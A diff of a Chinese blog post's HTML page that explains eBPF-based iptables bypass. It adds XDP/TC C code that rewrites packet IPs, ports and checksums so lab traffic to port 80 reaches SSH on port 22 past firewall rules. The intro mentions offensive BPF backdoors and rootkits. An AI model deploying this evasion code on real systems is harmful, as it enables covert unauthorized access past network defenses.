@@ -1712,8 +1712,35 @@
       
       <h3 id="前言">前言</h3>
 <p>最近一段时间疯狂看eBPF，从一开始的bcc和python写了<a href="/posts/bpf_uprobe_bypass_go_tls/">bypass golang tls的小工具</a>开始；看了美团蓝军大佬<a href="https://www.cnxct.com/">CFC4N的博客</a>bypass iptables伪代码并有了此文；看了Gregg的书《BPF Performance Tools》，系统地了解了追踪点，了解了bcc、bpftrace基本用法；跟着<a href="https://embracethered.com/blog/tags/ebpf/">wunderwuzzi</a>和<a href="https://xcellerator.github.io/">TheXcellerator</a>的系列博客，完成了一些offensive bpf程序，包括后门程序，隐藏文件、进程，容器逃逸，rootkit等等，总结文章大概在几天后发布；看了defcon29上的两个演讲并尝试了两个对应的库：<a href="https://github.com/pathtofile/bad-bpf">bad-bpf</a>和<a href="https://github.com/Gui774ume/ebpfkit">ebpfkit</a>。到此也可以算是半条腿迈进了eBPF的世界了吧。</p>
+<h3 id="原理">原理</h3>
+<p>数据进入内核的链路如图，XDP-&gt;TC-&gt;Netfilter-&gt;TCP Stack-&gt;Socket  出内核自然是相反方向</p>
+<p>所以进入内核前通过XDP修改来源的IP和目标端口 然后传出内核前通过TC修改目标IP和来源端口 以此来绕过iptables的检测</p>
+<p><img src="/images/posts/ebpf_bypass_iptables/image-20220623164351843.png" alt="image-20220623164351843" /></p>
+<p>XDP只能hook ingress，TC可以hook ingress和egress，所以egress只能用TC</p>
+<h3 id="效果">效果</h3>
+<style>
+#biliplayer {
+    width: 100%;
+    height: 550px;
+}
+@media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
+    #biliplayer {
+    width: 100%;
+    height: 250px;
+    }
+}
+</style>
+
+
+
+
+
+
+<div><iframe id="biliplayer" src="//player.bilibili.com/player.html?bvid=BV1gY4y137Bj&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > </iframe></div>
+
+
 <h3 id="实现">实现</h3>
-<p>参考博客中伪代码中只有一个ipv4_csum函数，经查找发现是内核中的sample代码的函数如下，实际试用后感觉效果不好，遂自己实现了一个见后文代码。</p>
+<p>参考博客中伪代码中只有一个ipv4_csum函数，经查找发现是内核中的sample代码的函数如下，实际试用后感觉效果不好，遂自己实现了一个，见文章末尾代码。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1760,6 +1787,23 @@
 </span></span><span class="line"><span class="cl">    <span class="n">ipv4_csum</span><span class="p">(</span><span class="n">tcphdr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">csum</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后注：查看内核<code>tools/bpf/resolve_btfids/libbpf/bpf_helper_defs.h</code>可以看到内核中还实现了以下代码可以计算checksum，也可以看 ref 2 的仓库里示例代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">u64</span> <span class="p">(</span><span class="o">*</span><span class="n">btf_bpf_l3_csum_replace</span><span class="p">)(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">u64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">u64</span> <span class="p">(</span><span class="o">*</span><span class="n">btf_bpf_l4_csum_replace</span><span class="p">)(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">u64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">u64</span> <span class="p">(</span><span class="o">*</span><span class="n">btf_bpf_csum_diff</span><span class="p">)(</span><span class="n">__be32</span> <span class="o">*</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">__be32</span> <span class="o">*</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">__wsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">u64</span> <span class="p">(</span><span class="o">*</span><span class="n">btf_bpf_csum_update</span><span class="p">)(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="p">,</span> <span class="n">__wsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">u64</span> <span class="p">(</span><span class="o">*</span><span class="n">btf_bpf_csum_level</span><span class="p">)(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="p">,</span> <span class="n">u64</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>说简单其实很简单，就是拿着结构体去匹配匹配，修改一下数据。</p>
@@ -1874,6 +1918,8 @@
 </span><span class="lnt">103
 </span><span class="lnt">104
 </span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;vmlinux.h&#34;</span><span class="cp">
@@ -1890,6 +1936,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define TC_ACT_REPEAT       6
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define TC_ACT_REDIRECT     7
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define TC_ACT_TRAP		    8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define ETH_HLEN    14
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define ETH_P_IP	0x0800
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define __swab16(x) (__u16)__builtin_bswap16((__u16)(x))
@@ -1923,7 +1970,7 @@
 </span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcphdr</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ethhdr</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">eth</span><span class="o">-&gt;</span><span class="n">h_proto</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_IP</span><span class="p">)){</span> <span class="c1">// &lt;linux/if_ether.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">==</span> <span class="mh">0x0188a8c0</span> <span class="o">&amp;&amp;</span> <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">==</span> <span class="mh">0x8388a8c0</span> <span class="o">&amp;&amp;</span> <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">                <span class="n">__u32</span> <span class="n">ipcsum</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">check</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="n">__u32</span> <span class="n">tcpcsum</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">check</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="c1">// 00:0C:29:63:31:6E
@@ -1936,8 +1983,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// eth-&gt;h_source[5] = 0x00;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">                <span class="c1">// 伪装ip来源
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span><span class="p">,</span><span class="mh">0x0189a8c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ipcsum</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="mh">0x0189a8c0</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span><span class="p">,</span><span class="mh">0x8389a8c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ipcsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 让传入靶机的tcpchecksum正确
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span><span class="p">,</span><span class="mh">0x8389a8c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tcpcsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="mh">0x8389a8c0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">ipcsum</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="c1">// 修改tcp目标端口
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_16</span><span class="p">(</span><span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">,</span><span class="n">htons</span><span class="p">(</span><span class="mi">22</span><span class="p">),</span><span class="o">&amp;</span><span class="n">tcpcsum</span><span class="p">);</span>
@@ -1963,15 +2012,14 @@
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">eth</span><span class="o">-&gt;</span><span class="n">h_proto</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_IP</span><span class="p">)){</span> <span class="c1">// &lt;linux/if_ether.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">            <span class="c1">// local:22-&gt;192.168.137.1:any
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">==</span> <span class="mh">0x0189a8c0</span> <span class="o">&amp;&amp;</span> <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="mi">22</span><span class="p">)){</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">==</span> <span class="mh">0x8389a8c0</span> <span class="o">&amp;&amp;</span> <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">==</span> <span class="n">htons</span><span class="p">(</span><span class="mi">22</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">                <span class="n">__u32</span> <span class="n">ipcsum</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">check</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="n">__u32</span> <span class="n">tcpcsum</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">check</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                <span class="c1">// 修改ip目的地址
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span><span class="p">,</span><span class="mh">0x0188a8c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ipcsum</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="c1">// recover tcpchecksum offset
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="mh">0x0188a8c0</span><span class="p">,</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tcpcsum</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="mh">0x0188a8c0</span><span class="p">;</span> <span class="c1">// 192.168.136.1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span><span class="p">,</span><span class="mh">0x8388a8c0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ipcsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// recover tcpchecksum offset   // 让传回主机端的tcpchecksum正确
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">update_checksum_32</span><span class="p">(</span><span class="mh">0x8388a8c0</span><span class="p">,</span><span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tcpcsum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="mh">0x8388a8c0</span><span class="p">;</span> <span class="c1">// 192.168.136.1
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">iphdr</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">__swab16</span><span class="p">(</span><span class="n">ipcsum</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="c1">// 修改tcp来源端口
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">tcphdr</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
@@ -2722,6 +2770,8 @@ document.addEventListener('DOMContentLoaded', function () {
     <li>
       <ul>
         <li><a href="#前言">前言</a></li>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#效果">效果</a></li>
         <li><a href="#实现">实现</a></li>
         <li><a href="#参考">参考</a></li>
       </ul>
